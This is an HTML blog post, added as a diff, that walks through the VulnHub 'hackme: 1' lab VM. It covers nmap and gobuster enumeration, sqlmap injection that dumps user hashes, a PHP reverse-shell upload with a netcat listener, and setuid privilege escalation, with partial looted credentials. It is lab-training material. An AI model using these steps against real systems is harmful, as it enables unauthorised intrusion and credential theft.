@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+
+   </head>
+  <body>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1>[VulnHub] hackme: 1</h1>
+                  <p><a href="/posts/20190926_vulnhub-imf.html"> « </a>📅 published on <code>27/Sep/2019</code><a href="/posts/20190928_vulnhub-kioptrix1.html"> » </a></p>
+                <h2>Overview</h2>
+<p>This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hackme-1,330/">hackme: 1</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
+<p><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_hackme/killchain.png" /></p>
+<h2>Phase #1: Enumeration</h2>
+<p>1. Here's the Nmap scan result:  </p>
+<pre><code># Nmap 7.70 scan initiated Fri Sep 27 12:01:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.hackme/results/192.168.92.180/scans/xml/_quick_tcp_nmap.xml 192.168.92.180
+Nmap scan report for 192.168.92.180
+Host is up, received arp-response (0.0022s latency).
+Scanned at 2019-09-27 12:01:03 PDT for 11s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0KQXcUd/+zfBtJFhP+25xVD0f+ujGrlKTw/Ho8wy41nYgrtyHiiscKmJUv7XKAfjC8YImead1E+okzuRvpT1HX3l1xMwfWboty0V3IezTFxYIpUPmqejoC9uSsKxpd5h+vDRwchjCQGZpumuei5QT+OyY7XpdUB3P/lica+QEO2Af4ZFmeOOizRYvabosnbg2rGObbkTbMZVcGdL67ECncSRP5mcjH2cnXqAAiDEs+F9YtR0oRVX8+SqaVXLqrNzIeZxqH8BW1f0O4SPq5tsHiYbCco4yb9iMgnX1EPd981wt40+6D0N3BB1QYciv6RAS4fKCP+Akk2c4tThBGm7t
+|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKTgFkEMmekHRtPsKN9f6w7/m1ih/8MraIwM4yIy5/hRW8ct1Ghc6YnhhI0KJGYF6KYiCgyKK97mVEpBVf98O5w=
+|   256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPPEwLR2lULYITB1F789nQ/INIXH6NhMCHK25Z3pJquX
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.34 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.34 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 00:0C:29:49:EA:B5 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Sep 27 12:01:14 2019 -- 1 IP address (1 host up) scanned in 12.51 seconds
+</code></pre>
+
+<p>2. We find quite a few interesting links from the <code>gobuster</code> scan and open the <code>http://192.168.92.180:80/index.php</code> page to explore the web application further:  </p>
+<pre><code>gobuster -u http://192.168.92.180:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s &quot;200,204,301,302,307,401,403&quot; -x &quot;txt,html,php,asp,aspx,jsp&quot;
+  http://192.168.92.180:80/config.php (Status: 200) [Size: 0]
+  http://192.168.92.180:80/index.php (Status: 200) [Size: 100]
+  http://192.168.92.180:80/index.php (Status: 200) [Size: 100]
+  http://192.168.92.180:80/login.php (Status: 200) [Size: 1245]
+  http://192.168.92.180:80/logout.php (Status: 302)
+  http://192.168.92.180:80/register.php (Status: 200) [Size: 1937]
+  http://192.168.92.180:80/server-status (Status: 403) [Size: 302]
+  http://192.168.92.180:80/uploads (Status: 301)
+  http://192.168.92.180:80/welcome.php (Status: 302)
+</code></pre>
+
+<p>3. We are redirected to the <code>http://192.168.92.180:80/login.php</code> link at every page visit so we try some common credentials and SQLi attempts. When these do not help, we decide to use the registration option which takes us to the <code>http://192.168.92.180:80/register.php</code> page. We register a username <code>foobar</code> with <code>foobar</code> password and get logged in to the web application:  </p>
+<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_hackme/screenshot01.png" />  </p>
+<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_vulnhub_hackme/screenshot02.png" />  </p>
+<p><img alt="writeup.enumeration.steps.3.3" src="/static/files/posts_vulnhub_hackme/screenshot03.png" />  </p>
+<h3>Findings</h3>
+<h4>Open Ports:</h4>
+<pre><code>22/tcp  |  ssh   |  OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp  |  http  |  Apache httpd 2.4.34 ((Ubuntu))
+</code></pre>
+
+<h2>Phase #2: Exploitation</h2>
+<p>1. The web application presents an online book catalog with a search box. We run <code>sqlmap</code> on this page and find the search function vulnerable to SQLi. We dump contents of <code>webapphacking</code> database and find MD5 hashed passwords within <code>users</code> table. Most of these passwords are easily cracked but we had to use an online MD5 cracker for the password hash of user <code>superadmin</code>:  </p>
+<pre><code>cat searchform.txt
+  POST /welcome.php HTTP/1.1
+  Host: 192.168.92.180
+  User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+  Accept-Language: en-US,en;q=0.5
+  Accept-Encoding: gzip, deflate
+  Referer: http://192.168.92.180/welcome.php
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 11
+  Cookie: PHPSESSID=a9nbe6ikh8ugo269h3rckltqp1
+  DNT: 1
+  Connection: close
+  Upgrade-Insecure-Requests: 1
+
+  search=test
+sqlmap -r searchform.txt --dbs --batch
+sqlmap -r searchform.txt -D webapphacking --dump-all --batch
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_hackme/screenshot04.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_hackme/screenshot05.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_hackme/screenshot06.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_vulnhub_hackme/screenshot07.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.5" src="/static/files/posts_vulnhub_hackme/screenshot08.png" />  </p>
+<p><img alt="writeup.exploitation.steps.1.6" src="/static/files/posts_vulnhub_hackme/screenshot09.png" />  </p>
+<p>2. We log in to the web application as user <code>superadmin</code> and are presented with file upload functionality. We create a PHP reverse shell file and upload it successfully. There was no need to bypass any kind of upload filters in this case. The location for uploaded files is already known to be <code>192.168.92.180/uploads/</code> directory from the <code>gobuster</code> scan. We find our uploaded file within this directory and proceeded to get the initial shell:  </p>
+<pre><code>nc -nlvp 443
+192.168.92.180/uploads/rs.php
+</code></pre>
+
+<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_hackme/screenshot10.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_hackme/screenshot11.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_hackme/screenshot12.png" />  </p>
+<p><img alt="writeup.exploitation.steps.2.4" src="/static/files/posts_vulnhub_hackme/screenshot13.png" />  </p>
+<h2>Phase #2.5: Post Exploitation</h2>
+<pre><code>www-data@hackme&gt; id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@hackme&gt;  
+www-data@hackme&gt; uname
+Linux hackme 4.18.0-16-generic #17-Ubuntu SMP Fri Feb 8 00:06:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+www-data@hackme&gt;  
+www-data@hackme&gt; ifconfig
+ens33:  flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.92.180  netmask 255.255.255.0  broadcast 192.168.92.255
+        inet6 fe80::20c:29ff:fe49:eab5  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether 00:0c:29:49:ea:b5  txqueuelen 1000  (Ethernet)
+        RX packets 486204  bytes 304231697 (304.2 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 315253  bytes 40538335 (40.5 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+www-data@hackme&gt;  
+www-data@hackme&gt; users
+root
+hackme
+</code></pre>
+
+<h2>Phase #3: Privilege Escalation</h2>
+<p>1. We start with usuals and explore <code>crontab</code> and <code>sudo</code> permissions. Next is searching for <code>setuid</code> files. We find an interesting file <code>/home/legacy/touchmenot</code>:  </p>
+<pre><code>find / -type f -perm -04000 2&gt;/dev/null
+  /home/legacy/touchmenot
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_hackme/screenshot14.png" />  </p>
+<p><img alt="writeup.privesc.steps.1.2" src="/static/files/posts_vulnhub_hackme/screenshot15.png" />  </p>
+<p>2. We locate this file and check it's permissions manually. We then procced to execute this file and get elevated access:  </p>
+<pre><code>ls -la /home/legacy/touchmenot
+file /home/legacy/touchmenot
+/home/legacy/touchmenot
+</code></pre>
+
+<p><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_hackme/screenshot16.png" />  </p>
+<h2>Loot</h2>
+<h3>Hashes</h3>
+<pre><code>hackme:$6$.L285vCy$Hma4mKjGV.sE7ZCFVj2iOkRokX1u3F5DMiTPQFoZPJnQ1kUXLje/bY2BIUQFbYu.8M6BvLML5fAftZOCE........................
+</code></pre>
+
+<h3>Credentials</h3>
+<pre><code>webapp: user1/he..., user2/comma..., user3/p@ssw..., test/testt..., superadmin/Uncrac....., test1/testt...
+</code></pre>
+
+<h2>References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a>  </li>
+<li><a href="https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/">https://www.hackingarticles.in/hackme-1-vulnhub-walkthrough/</a>  </li>
+</ul>
+        <hr/>
+        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#oscp>oscp</a>, <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeups>writeups</a>)</p>
+                  <p style="text-align:center;">« <a href="/posts/20190926_vulnhub-imf.html">[VulnHub] IMF: 1...</a> « | » <a href="/posts/20190928_vulnhub-kioptrix1.html">[VulnHub] Kioptrix: Level 1 (#...</a> »</p>
+                <hr/>
+    </div>
+    <div class="footer">
+      <p style="text-align:center;">[<a href="https://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">📝 CC BY 4.0</a>]</p>
+    </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+  </body>
+</html>
